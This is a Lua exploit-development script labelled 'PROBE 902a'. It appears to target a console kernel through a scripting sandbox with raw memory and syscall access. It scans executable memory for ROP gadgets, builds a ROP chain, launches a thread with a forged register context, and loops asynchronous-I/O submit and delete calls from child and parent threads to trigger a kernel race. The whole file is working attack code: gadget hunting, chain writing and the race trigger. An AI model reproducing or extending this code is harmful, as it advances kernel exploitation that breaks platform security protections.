-- CRASH_CLASS: HIGH
-- PROBE 902a: 896a died at round 4 with cancel+poll+delete in the loop. This removes
-- cancel and poll entirely: submit, child delete, parent delete. If it still dies at
-- round 4 the child's delete is the cause; if it survives 12 rounds the death was the
-- cancel/poll interleaving. Chain uses an explicit zero for the unused rcx slot.
print("=== PROBE 902a: child delete, no cancel ===")
local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local fn=to_num(syscall.pipe.fn_addr)
print("[0] pid="..tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
local info=memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
local function find_pat(base,limit,pat)
    local off=0
    while off<limit do local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true); if i then return base+off+i-1 end
        off=off+want end
end
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,0x494000,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,0x494000,string.char(0x5A,0xC3))
local pop_rcx=find_pat(ebase,0x494000,string.char(0x59,0xC3))
local store  =find_pat(ebase,0x494000,string.char(0x48,0x89,0x07,0xC3))
local jmp_g  =find_pat(ebase,0x494000,string.char(0xEB,0xFE))
print(string.format("[0] gadgets rax=%s rdi=%s rsi=%s rdx=%s rcx=%s store=%s jmp=%s",
  tostring(pop_rax),tostring(pop_rdi),tostring(pop_rsi),tostring(pop_rdx),tostring(pop_rcx),tostring(store),tostring(jmp_g)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and pop_rcx and store and jmp_g) then print("missing gadget") return end
local page=0x4000
local function mmap(px) local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local ctx=memory.alloc(0x500); local tb=memory.alloc(8)
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,uint64(0)); wq(ts+8,uint64(ms*1000000)); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
local function child4(sys,a1,a2,a3,a4,out)
    local block=mmap(page*4); local start=block+page*4-0x200
    local ch={pop_rdi,a1,pop_rsi,a2,pop_rdx,a3,pop_rcx,a4,pop_rax,sys,fn,pop_rdi,out,store,jmp_g}
    for i=1,14 do
        local v=ch[i]
        if v==nil then print("[!] chain slot "..i.." nil"); return -997 end
        wq(start+(i-1)*8,uint64(v))
    end
    zero(ctx,0x500)
    wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
    wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
    wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(start))
    wq(ctx+Ctx.RDI,uint64(a1)); wq(ctx+Ctx.RSI,uint64(a2)); wq(ctx+Ctx.RDX,uint64(a3))
    wq(ctx+Ctx.RCX,uint64(a4)); wq(ctx+Ctx.R8,uint64(0)); wq(ctx+Ctx.RAX,uint64(sys))
    wq(tb,uint64(0))
    local ok,rv=pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
    return ok and to_num(rv) or -998
end
local sv=memory.alloc(8); zero(sv,8)
pcall(function() mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
local fd=rd(sv); print("[1] socketpair fd="..tostring(fd))
local N=2
local reqs=memory.alloc(0x28*N); zero(reqs,0x28*N)
local buf=memory.alloc(0x1000); zero(buf,0x1000)
local b=to_num(buf)
for i=0,N-1 do local r=reqs+i*0x28
  wd(r+0x08,0x1000); wd(r+0x10,b%4294967296); wd(r+0x14,math.floor(b/4294967296)); wd(r+0x20,fd) end
local ids=memory.alloc(32); zero(ids,32)
local st=memory.alloc(32); local er=memory.alloc(32); local er2=memory.alloc(32); local ob=memory.alloc(8)
for round=1,12 do
    zero(ids,32); zero(st,32); zero(er,32); zero(er2,32); zero(ob,8)
    local o,r=pcall(function() return mk(669)(uint64(0x1001),uint64(reqs),uint64(N),uint64(3),uint64(ids)) end)
    if not o then print("[R"..round.."] submit FAIL") break end
    sleep_ms(4)
    local rv=child4(662,to_num(ids),N,to_num(er),0,to_num(ob))
    sleep_ms(40)
    local o2,r2=pcall(function() return mk(662)(uint64(ids),uint64(N),uint64(er2)) end)
    print(string.format("[R%d] child rv=%d rax=%X errs=%X,%X | parent ret=%s errs=%X,%X",
        round,rv,rd(ob) or 0,rd(er) or 0,rd(er+4) or 0,
        tostring(o2 and to_num(r2) or "FAIL"),rd(er2) or 0,rd(er2+4) or 0))
    sleep_ms(60)
end
print("[Z] alive pid="..tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
